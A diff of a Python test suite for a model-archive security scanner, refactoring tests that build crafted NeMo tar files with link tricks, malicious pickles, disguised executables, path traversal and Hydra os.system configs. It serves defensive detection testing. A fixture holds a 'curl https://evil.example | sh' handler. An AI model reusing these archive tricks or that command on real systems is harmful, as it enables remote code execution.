     def test_checkpoint_hardlink_to_symlink_source_fails_closed(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-hardlink-to-symlink-source.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "payload.bin", b"safe weights")
             _add_tar_link(tar, "alias.bin", "payload.bin", tarfile.SYMTYPE)
             _add_tar_link(tar, "model_weights.ckpt", "alias.bin", tarfile.LNKTYPE)
@@ -1948,8 +1889,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_checkpoint_regular_write_after_link_history_fails_closed(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-regular-after-link-history.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "payload.bin", b"safe weights")
             _add_tar_link(tar, "model_weights.ckpt", "payload.bin", tarfile.SYMTYPE)
             _add_tar_bytes(tar, "model_weights.ckpt", b"safe weights")
@@ -1962,8 +1902,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_checkpoint_fallback_symlink_then_binary_write_fails_closed(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-fallback-installed-symlink.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_link(tar, "target_link.bin", "model_weights.ckpt", tarfile.SYMTYPE)
             _add_tar_bytes(tar, "writer.bin", b"safe weights")
             _add_tar_link(tar, "writer.bin", "target_link.bin", tarfile.LNKTYPE)
@@ -1976,8 +1915,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_checkpoint_dangling_symlink_hardlink_fallback_then_write_fails_closed(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-dangling-symlink-hardlink-fallback.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_link(tar, "target_link.bin", "model_weights.ckpt", tarfile.SYMTYPE)
             _add_tar_link(tar, "writer.bin", "target_link.bin", tarfile.LNKTYPE)
             _add_tar_bytes(tar, "writer.bin", _build_malicious_pickle())
@@ -1989,8 +1927,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_checkpoint_ancestor_symlink_rebinding_before_loaded_hardlink_fails_closed(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-ancestor-symlink-rebinding.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_link(tar, "dir", "old", tarfile.SYMTYPE)
             _add_tar_bytes(tar, "dir/payload.bin", _build_malicious_pickle())
             _add_tar_link(tar, "dir/alias.bin", "payload.bin", tarfile.SYMTYPE)
@@ -2001,15 +1938,12 @@ class TestNemoArchiveVulnerabilityCoverage:
 
         result = NemoScanner().scan(str(nemo_path))
 
-        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
-        assert "nemo_link_resolution_unsupported" in result.metadata["scan_outcome_reasons"]
-        assert not any(check.details.get("cve_id") == "CVE-2025-23249" for check in result.checks)
+        _assert_unsupported_link_without_cve_2025_23249(result)
 
     def test_hardlink_checkpoint_alias_detects_unknown_type_write_through(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-unknown-type-write.nemo"
         malicious_payload = _build_malicious_pickle()
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "payload.bin", b"safe weights")
             _add_tar_link(tar, "model_weights.ckpt", "payload.bin", tarfile.LNKTYPE)
             unknown_payload = tarfile.TarInfo(name="payload.bin")
@@ -2028,8 +1962,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_large_checkpoint_member_fails_closed(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-large.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "model_weights.ckpt", b"not scanned")
 
         result = NemoScanner({"max_nemo_checkpoint_scan_bytes": 1}).scan(str(nemo_path))
@@ -2062,8 +1995,7 @@ class TestNemoArchiveVulnerabilityCoverage:
         )
 
         nemo_path = tmp_path / "checkpoint-nested-fails.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "model_weights.ckpt", b"checkpoint bytes")
 
         result = NemoScanner().scan(str(nemo_path))
@@ -2090,8 +2022,7 @@ class TestNemoArchiveVulnerabilityCoverage:
         )
 
         nemo_path = tmp_path / "checkpoint-no-scanner.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "model_weights.ckpt", b"checkpoint bytes")
 
         result = NemoScanner().scan(str(nemo_path))
@@ -2108,8 +2039,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_benign_checkpoint_pickle_no_nemo_deserialization_cve(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "checkpoint-safe.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "model_weights.ckpt", pickle.dumps({"weights": [1, 2, 3]}))
 
         result = NemoScanner().scan(str(nemo_path))
@@ -2118,8 +2048,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_embedded_python_member_retains_generic_tar_security_analysis(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "handler-rce.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "handler.py", b"import os\nos.system('echo hidden')\n")
 
         result = NemoScanner().scan(str(nemo_path))
@@ -2137,8 +2066,7 @@ class TestNemoArchiveVulnerabilityCoverage:
     ) -> None:
         monkeypatch.setattr("modelaudit.scanners.nemo_scanner.NEMO_MAX_PYTHON_ANALYSIS_BYTES", 8)
         nemo_path = tmp_path / "oversized-handler.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "handler.py", b"012345678")
 
         result = NemoScanner().scan(str(nemo_path))
@@ -2154,8 +2082,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_renamed_nemo_embedded_executable_retains_archive_member_analysis(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "embedded-executable.jpg"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "assets/payload.jpg", b"\x7fELF\x02\x01\x01\x00")
 
         result = scan_file(str(nemo_path), config={"cache_scan_results": False})
@@ -2171,8 +2098,7 @@ class TestNemoArchiveVulnerabilityCoverage:
         payload[0x3C:0x40] = (8192).to_bytes(4, "little")
         payload[8192:8196] = b"PE\0\0"
         nemo_path = tmp_path / "embedded-pe.jpg"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "assets/payload.jpg", bytes(payload))
 
         result = scan_file(str(nemo_path), config={"cache_scan_results": False})
@@ -2191,8 +2117,7 @@ class TestNemoArchiveVulnerabilityCoverage:
             archive.writestr("handler.py", b"import os\nos.system('echo hidden')\n")
 
         nemo_path = tmp_path / "nested-bundle.jpg"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "assets/bundle.zip", nested_archive.getvalue())
 
         result = scan_file(str(nemo_path), config={"cache_scan_results": False})
@@ -2207,8 +2132,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_renamed_nemo_retains_auxiliary_yaml_template_scanning(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "templated-model.jpg"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(
                 tar,
                 "chat_model_config.yaml",
@@ -2227,8 +2151,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_large_disguised_executable_is_detected_from_bounded_prefix(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "large-embedded-executable.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "assets/payload.jpg", b"\x7fELF" + (b"\x00" * (10 * 1024 * 1024 + 1)))
 
         result = NemoScanner().scan(str(nemo_path))
@@ -2242,8 +2165,7 @@ class TestNemoArchiveVulnerabilityCoverage:
         payload[0x3C:0x40] = (8192).to_bytes(4, "little")
         payload[8192:8196] = b"PE\0\0"
         nemo_path = tmp_path / "embedded-pe.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "assets/payload.jpg", bytes(payload))
 
         result = NemoScanner().scan(str(nemo_path))
@@ -2257,8 +2179,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
     def test_benign_embedded_python_member_does_not_create_security_finding(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "benign-handler.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "handler.py", b"def build_model():\n    return 'safe'\n")
 
         result = NemoScanner().scan(str(nemo_path))
@@ -2271,8 +2192,7 @@ class TestNemoArchiveVulnerabilityCoverage:
             "model": {"_target_": "nemo.Model"},
             "tokenizer": {"model": "nemo:artifacts/payload.jpg"},
         }
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", yaml.safe_dump(config).encode())
+        with _open_nemo_with_root_config(nemo_path, yaml.safe_dump(config).encode()) as tar:
             _add_tar_bytes(tar, "artifacts/payload.jpg", _build_malicious_pickle())
 
         result = NemoScanner().scan(str(nemo_path))
@@ -2294,8 +2214,7 @@ class TestNemoArchiveVulnerabilityCoverage:
             "model": {"_target_": "nemo.Model"},
             "tokenizer": {"model": "nemo:artifacts/payload.jpg"},
         }
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", yaml.safe_dump(config).encode())
+        with _open_nemo_with_root_config(nemo_path, yaml.safe_dump(config).encode()) as tar:
             _add_tar_bytes(tar, "artifacts/payload.jpg", b"safe payload")
             _add_tar_link(tar, "writer.bin", "artifacts/payload.jpg", tarfile.LNKTYPE)
             _add_tar_bytes(tar, "writer.bin", _build_malicious_pickle())
@@ -2312,8 +2231,7 @@ class TestNemoArchiveVulnerabilityCoverage:
             "model": {"_target_": "nemo.Model"},
             "tokenizer": {"model": "nemo:artifacts/payload.jpg"},
         }
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", yaml.safe_dump(config).encode())
+        with _open_nemo_with_root_config(nemo_path, yaml.safe_dump(config).encode()) as tar:
             _add_tar_bytes(tar, "artifacts/payload.jpg", b"safe payload")
             _add_tar_bytes(tar, "other.bin", b"safe payload")
             _add_tar_link(tar, "writer.bin", "other.bin", tarfile.LNKTYPE)
@@ -2356,8 +2274,7 @@ class TestNemoArchiveVulnerabilityCoverage:
 
         monkeypatch.setattr(NemoScanner, "_archive_has_link_mediated_loaded_path", classmethod(track_replay))
         nemo_path = tmp_path / "referenced-many-benign-artifacts.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", yaml.safe_dump(config).encode())
+        with _open_nemo_with_root_config(nemo_path, yaml.safe_dump(config).encode()) as tar:
             for name in referenced_names:
                 _add_tar_bytes(tar, name, b"plain tokenizer bytes")
 
@@ -2372,8 +2289,7 @@ class TestNemoArchiveVulnerabilityCoverage:
             "model": {"_target_": "nemo.Model"},
             "checkpoint": "nemo:model_weights.ckpt",
         }
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", yaml.safe_dump(config).encode())
+        with _open_nemo_with_root_config(nemo_path, yaml.safe_dump(config).encode()) as tar:
             _add_tar_bytes(tar, "model_weights.ckpt", _build_malicious_pickle())
 
         result = NemoScanner().scan(str(nemo_path))
@@ -2406,8 +2322,7 @@ class TestNemoArchiveVulnerabilityCoverage:
             "model": {"_target_": "nemo.Model"},
             "tokenizer": {"model": "nemo:artifacts/tokenizer.model"},
         }
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", yaml.safe_dump(config).encode())
+        with _open_nemo_with_root_config(nemo_path, yaml.safe_dump(config).encode()) as tar:
             _add_tar_bytes(tar, "artifacts/tokenizer.model", b"not scanned")
 
         result = NemoScanner({"max_nemo_checkpoint_scan_bytes": 1}).scan(str(nemo_path))
@@ -2447,8 +2362,7 @@ class TestNemoArchiveVulnerabilityCoverage:
             "model": {"_target_": "nemo.Model"},
             "tokenizer": {"model": "nemo:artifacts/tokenizer.model"},
         }
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", yaml.safe_dump(config).encode())
+        with _open_nemo_with_root_config(nemo_path, yaml.safe_dump(config).encode()) as tar:
             _add_tar_bytes(tar, "artifacts/tokenizer.model", b"payload")
 
         result = NemoScanner().scan(str(nemo_path))
@@ -2484,8 +2398,7 @@ class TestNemoArchiveVulnerabilityCoverage:
             "model": {"_target_": "nemo.Model"},
             "tokenizer": {"model": "nemo:artifacts/tokenizer.model"},
         }
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", yaml.safe_dump(config).encode())
+        with _open_nemo_with_root_config(nemo_path, yaml.safe_dump(config).encode()) as tar:
             _add_tar_bytes(tar, "artifacts/tokenizer.model", b"payload")
 
         result = NemoScanner().scan(str(nemo_path))
@@ -2511,8 +2424,7 @@ class TestNemoArchiveVulnerabilityCoverage:
             "model": {"_target_": "nemo.Model"},
             "tokenizer": {"model": "nemo:artifacts/tokenizer.model"},
         }
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", yaml.safe_dump(config).encode())
+        with _open_nemo_with_root_config(nemo_path, yaml.safe_dump(config).encode()) as tar:
             _add_tar_bytes(tar, "artifacts/tokenizer.model", b"plain tokenizer bytes")
 
         result = NemoScanner().scan(str(nemo_path))
@@ -2535,8 +2447,7 @@ class TestNemoArchiveVulnerabilityCoverage:
             )
             archive.writestr("weights.bin", b"weights")
             archive.writestr("handler.py", b"import os\nos.system('curl https://evil.example | sh')\n")
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", yaml.safe_dump(config).encode())
+        with _open_nemo_with_root_config(nemo_path, yaml.safe_dump(config).encode()) as tar:
             _add_tar_bytes(tar, "artifacts/handler.mar", mar_payload.getvalue())
 
         result = NemoScanner().scan(str(nemo_path))
@@ -2593,10 +2504,7 @@ class TestNemoArchiveVulnerabilityCoverage:
             archive.writestr("handler.py", b"import os\nos.system('curl https://evil.example | sh')\n")
         with tarfile.open(nemo_path, "w") as tar:
             for alias in ("autoload.ckpt", "configured.ckpt"):
-                link_info = tarfile.TarInfo(name=alias)
-                link_info.type = tarfile.SYMTYPE
-                link_info.linkname = "artifacts/handler.mar"
-                tar.addfile(link_info)
+                _add_tar_link(tar, alias, link_type=tarfile.SYMTYPE, target="artifacts/handler.mar")
             _add_tar_bytes(tar, "model_config.yaml", yaml.safe_dump(config).encode())
             _add_tar_bytes(tar, "artifacts/handler.mar", mar_payload.getvalue())
 
@@ -2615,8 +2523,7 @@ class TestNemoArchiveVulnerabilityCoverage:
             zipf.writestr("../../evil.pkl", b"not a pickle")
 
         nemo_path = tmp_path / "checkpoint-archive-traversal.nemo"
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(nemo_path) as tar:
             _add_tar_bytes(tar, "model_weights.pt", nested_checkpoint.getvalue())
 
         result = NemoScanner().scan(str(nemo_path))
@@ -2637,8 +2544,7 @@ class TestNemoArchiveVulnerabilityCoverage:
             _add_tar_bytes(archive, "three.bin", b"three")
 
         path = tmp_path / "nested-limit.jpg"
-        with tarfile.open(path, "w") as archive:
-            _add_tar_bytes(archive, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(path) as archive:
             _add_tar_bytes(archive, "assets/bundle.tar", nested_tar.getvalue())
 
         result = scan_file(str(path), config={"cache_scan_results": False, "max_tar_entries": 2})
@@ -2757,20 +2663,11 @@ class TestCVE202523304HydraTarget:
         path = tmp_path / "linked-config.jpg"
         with tarfile.open(path, "w") as archive:
             _add_tar_bytes(archive, payload_name, b"model:\n  _target_: os.system\n  command: echo pwned\n")
-            link_info = tarfile.TarInfo(config_name)
-            link_info.type = link_type
-            link_info.linkname = "payload.txt"
-            archive.addfile(link_info)
+            _add_tar_link(archive, config_name, link_type=link_type, target="payload.txt")
 
         result = scan_file(str(path), config={"cache_scan_results": False})
 
-        assert result.scanner_name == "nemo"
-        assert any(
-            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
-            and check.status == CheckStatus.FAILED
-            and check.details["target"] == "os.system"
-            for check in result.checks
-        )
+        _assert_nemo_reports_os_system_target(result)
 
     def test_core_routes_forward_hardlink_root_config_for_fail_closed_scan(self, tmp_path: Path) -> None:
         path = tmp_path / "forward-hardlink-config.jpg"
@@ -2820,13 +2717,7 @@ class TestCVE202523304HydraTarget:
 
         result = scan_file(str(path), config={"cache_scan_results": False})
 
-        assert result.scanner_name == "nemo"
-        assert any(
-            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
-            and check.status == CheckStatus.FAILED
-            and check.details["target"] == "os.system"
-            for check in result.checks
-        )
+        _assert_nemo_reports_os_system_target(result)
 
     def test_core_routes_forward_symlink_root_config_chain(self, tmp_path: Path) -> None:
         path = tmp_path / "forward-symlink-config-chain.jpg"
@@ -2837,13 +2728,7 @@ class TestCVE202523304HydraTarget:
 
         result = scan_file(str(path), config={"cache_scan_results": False})
 
-        assert result.scanner_name == "nemo"
-        assert any(
-            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
-            and check.status == CheckStatus.FAILED
-            and check.details["target"] == "os.system"
-            for check in result.checks
-        )
+        _assert_nemo_reports_os_system_target(result)
 
     def test_core_does_not_report_shadowed_malicious_hardlink_chain_target(self, tmp_path: Path) -> None:
         path = tmp_path / "shadowed-hardlink-config-chain.jpg"
@@ -2867,13 +2752,7 @@ class TestCVE202523304HydraTarget:
 
         result = scan_file(str(path), config={"cache_scan_results": False})
 
-        assert result.scanner_name == "nemo"
-        assert any(
-            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
-            and check.status == CheckStatus.FAILED
-            and check.details["target"] == "os.system"
-            for check in result.checks
-        )
+        _assert_nemo_reports_os_system_target(result)
 
     def test_core_does_not_report_later_safe_hardlink_target_replacement(self, tmp_path: Path) -> None:
         path = tmp_path / "later-safe-hardlink-config-replacement.jpg"
@@ -2898,13 +2777,7 @@ class TestCVE202523304HydraTarget:
 
         result = scan_file(str(path), config={"cache_scan_results": False})
 
-        assert result.scanner_name == "nemo"
-        assert any(
-            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
-            and check.status == CheckStatus.FAILED
-            and check.details["target"] == "os.system"
-            for check in result.checks
-        )
+        _assert_nemo_reports_os_system_target(result)
 
     def test_core_reports_write_through_later_hardlink_alias(self, tmp_path: Path) -> None:
         path = tmp_path / "hardlink-config-later-alias-write.jpg"
@@ -2916,13 +2789,7 @@ class TestCVE202523304HydraTarget:
 
         result = scan_file(str(path), config={"cache_scan_results": False})
 
-        assert result.scanner_name == "nemo"
-        assert any(
-            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
-            and check.status == CheckStatus.FAILED
-            and check.details["target"] == "os.system"
-            for check in result.checks
-        )
+        _assert_nemo_reports_os_system_target(result)
 
     def test_core_reports_write_through_later_symlink_alias(self, tmp_path: Path) -> None:
         path = tmp_path / "hardlink-config-later-symlink-write.jpg"
@@ -2934,13 +2801,7 @@ class TestCVE202523304HydraTarget:
 
         result = scan_file(str(path), config={"cache_scan_results": False})
 
-        assert result.scanner_name == "nemo"
-        assert any(
-            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
-            and check.status == CheckStatus.FAILED
-            and check.details["target"] == "os.system"
-            for check in result.checks
-        )
+        _assert_nemo_reports_os_system_target(result)
 
     def test_core_reports_colliding_hardlink_fallback_write(self, tmp_path: Path) -> None:
         path = tmp_path / "hardlink-config-collision-write.jpg"
@@ -2953,13 +2814,7 @@ class TestCVE202523304HydraTarget:
 
         result = scan_file(str(path), config={"cache_scan_results": False})
 
-        assert result.scanner_name == "nemo"
-        assert any(
-            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
-            and check.status == CheckStatus.FAILED
-            and check.details["target"] == "os.system"
-            for check in result.checks
-        )
+        _assert_nemo_reports_os_system_target(result)
 
     def test_core_reports_nested_hardlink_fallback_write(self, tmp_path: Path) -> None:
         path = tmp_path / "hardlink-config-nested-collision-write.jpg"
@@ -2974,13 +2829,7 @@ class TestCVE202523304HydraTarget:
 
         result = scan_file(str(path), config={"cache_scan_results": False})
 
-        assert result.scanner_name == "nemo"
-        assert any(
-            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
-            and check.status == CheckStatus.FAILED
-            and check.details["target"] == "os.system"
-            for check in result.checks
-        )
+        _assert_nemo_reports_os_system_target(result)
 
     def test_core_preserves_hardlink_content_when_collision_falls_back_to_symlink(self, tmp_path: Path) -> None:
         path = tmp_path / "hardlink-config-collision-symlink-fallback.jpg"
@@ -2994,13 +2843,7 @@ class TestCVE202523304HydraTarget:
 
         result = scan_file(str(path), config={"cache_scan_results": False})
 
-        assert result.scanner_name == "nemo"
-        assert any(
-            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
-            and check.status == CheckStatus.FAILED
-            and check.details["target"] == "os.system"
-            for check in result.checks
-        )
+        _assert_nemo_reports_os_system_target(result)
 
     def test_core_fallback_symlink_back_to_hardlink_inode_fails_closed(self, tmp_path: Path) -> None:
         path = tmp_path / "hardlink-config-symlink-back-to-inode.jpg"
@@ -3028,13 +2871,7 @@ class TestCVE202523304HydraTarget:
 
         result = scan_file(str(path), config={"cache_scan_results": False})
 
-        assert result.scanner_name == "nemo"
-        assert any(
-            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
-            and check.status == CheckStatus.FAILED
-            and check.details["target"] == "os.system"
-            for check in result.checks
-        )
+        _assert_nemo_reports_os_system_target(result)
 
     def test_core_uses_final_colliding_hardlink_root_config(self, tmp_path: Path) -> None:
         path = tmp_path / "final-colliding-hardlink-root-config.jpg"
@@ -3046,13 +2883,7 @@ class TestCVE202523304HydraTarget:
 
         result = scan_file(str(path), config={"cache_scan_results": False})
 
-        assert result.scanner_name == "nemo"
-        assert any(
-            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
-            and check.status == CheckStatus.FAILED
-            and check.details["target"] == "os.system"
-            for check in result.checks
-        )
+        _assert_nemo_reports_os_system_target(result)
 
     def test_core_outer_symlink_detects_colliding_hardlink_mutation(self, tmp_path: Path) -> None:
         path = tmp_path / "outer-symlink-hardlink-mutation.jpg"
@@ -3066,13 +2897,7 @@ class TestCVE202523304HydraTarget:
 
         result = scan_file(str(path), config={"cache_scan_results": False})
 
-        assert result.scanner_name == "nemo"
-        assert any(
-            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
-            and check.status == CheckStatus.FAILED
-            and check.details["target"] == "os.system"
-            for check in result.checks
-        )
+        _assert_nemo_reports_os_system_target(result)
 
     def test_core_outer_symlink_does_not_report_rebound_safe_content(self, tmp_path: Path) -> None:
         path = tmp_path / "outer-symlink-hardlink-safe-rebinding.jpg"
@@ -3103,13 +2928,7 @@ class TestCVE202523304HydraTarget:
 
         result = scan_file(str(path), config={"cache_scan_results": False})
 
-        assert result.scanner_name == "nemo"
-        assert any(
-            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
-            and check.status == CheckStatus.FAILED
-            and check.details["target"] == "os.system"
-            for check in result.checks
-        )
+        _assert_nemo_reports_os_system_target(result)
 
     def test_core_reports_direct_unknown_type_root_config(self, tmp_path: Path) -> None:
         path = tmp_path / "direct-unknown-type-root-config.jpg"
@@ -3123,13 +2942,7 @@ class TestCVE202523304HydraTarget:
 
         result = scan_file(str(path), config={"cache_scan_results": False})
 
-        assert result.scanner_name == "nemo"
-        assert any(
-            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
-            and check.status == CheckStatus.FAILED
-            and check.details["target"] == "os.system"
-            for check in result.checks
-        )
+        _assert_nemo_reports_os_system_target(result)
 
     def test_core_reports_multi_hop_symlink_write_through(self, tmp_path: Path) -> None:
         path = tmp_path / "multi-hop-symlink-write-through.jpg"
@@ -3143,13 +2956,7 @@ class TestCVE202523304HydraTarget:
 
         result = scan_file(str(path), config={"cache_scan_results": False})
 
-        assert result.scanner_name == "nemo"
-        assert any(
-            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
-            and check.status == CheckStatus.FAILED
-            and check.details["target"] == "os.system"
-            for check in result.checks
-        )
+        _assert_nemo_reports_os_system_target(result)
 
     def test_core_hardlink_to_symlink_source_fails_closed(self, tmp_path: Path) -> None:
         path = tmp_path / "hardlink-to-symlink-source.jpg"
@@ -3333,8 +3140,7 @@ class TestCVE202523304HydraTarget:
 
     def test_unrelated_safe_symlink_does_not_mark_regular_nemo_config_incomplete(self, tmp_path: Path) -> None:
         path = tmp_path / "unrelated-safe-link.nemo"
-        with tarfile.open(path, "w") as archive:
-            _add_tar_bytes(archive, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(path) as archive:
             _add_tar_bytes(archive, "assets/logo.bin", b"logo")
             _add_tar_link(archive, "assets/latest", "logo.bin", tarfile.SYMTYPE)
 
@@ -3345,8 +3151,7 @@ class TestCVE202523304HydraTarget:
 
     def test_unused_alias_to_regular_nemo_config_does_not_mark_scan_incomplete(self, tmp_path: Path) -> None:
         path = tmp_path / "unused-root-alias.nemo"
-        with tarfile.open(path, "w") as archive:
-            _add_tar_bytes(archive, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(path) as archive:
             _add_tar_link(archive, "unused.yaml", "model_config.yaml", tarfile.SYMTYPE)
 
         result = NemoScanner().scan(str(path))
@@ -3356,8 +3161,7 @@ class TestCVE202523304HydraTarget:
 
     def test_unused_hardlink_alias_to_regular_nemo_config_does_not_mark_scan_incomplete(self, tmp_path: Path) -> None:
         path = tmp_path / "unused-root-hardlink-alias.nemo"
-        with tarfile.open(path, "w") as archive:
-            _add_tar_bytes(archive, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(path) as archive:
             _add_tar_link(archive, "unused.bin", "model_config.yaml", tarfile.LNKTYPE)
 
         result = NemoScanner().scan(str(path))
@@ -3367,8 +3171,7 @@ class TestCVE202523304HydraTarget:
 
     def test_write_through_hardlink_alias_to_regular_nemo_config_fails_closed(self, tmp_path: Path) -> None:
         path = tmp_path / "written-root-hardlink-alias.nemo"
-        with tarfile.open(path, "w") as archive:
-            _add_tar_bytes(archive, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(path) as archive:
             _add_tar_link(archive, "writer.bin", "model_config.yaml", tarfile.LNKTYPE)
             _add_tar_bytes(archive, "writer.bin", b"model:\n  _target_: os.system\n  command: echo pwned\n")
 
@@ -3379,8 +3182,7 @@ class TestCVE202523304HydraTarget:
 
     def test_fallback_symlink_detaches_loaded_alias_without_marking_incomplete(self, tmp_path: Path) -> None:
         path = tmp_path / "detached-root-symlink-alias.nemo"
-        with tarfile.open(path, "w") as archive:
-            _add_tar_bytes(archive, "model_config.yaml", b"model: safe\n")
+        with _open_nemo_with_root_config(path) as archive:
             _add_tar_link(archive, "writer.yaml", "model_config.yaml", tarfile.SYMTYPE)
             _add_tar_bytes(archive, "safe.txt", b"safe")
             _add_tar_link(archive, "safe_alias", "safe.txt", tarfile.SYMTYPE)
@@ -3453,8 +3255,7 @@ class TestCVE202523304HydraTarget:
         monkeypatch: pytest.MonkeyPatch,
     ) -> None:
         path = tmp_path / "prepass-symlink-resolution-budget.nemo"
-        with tarfile.open(path, "w") as archive:
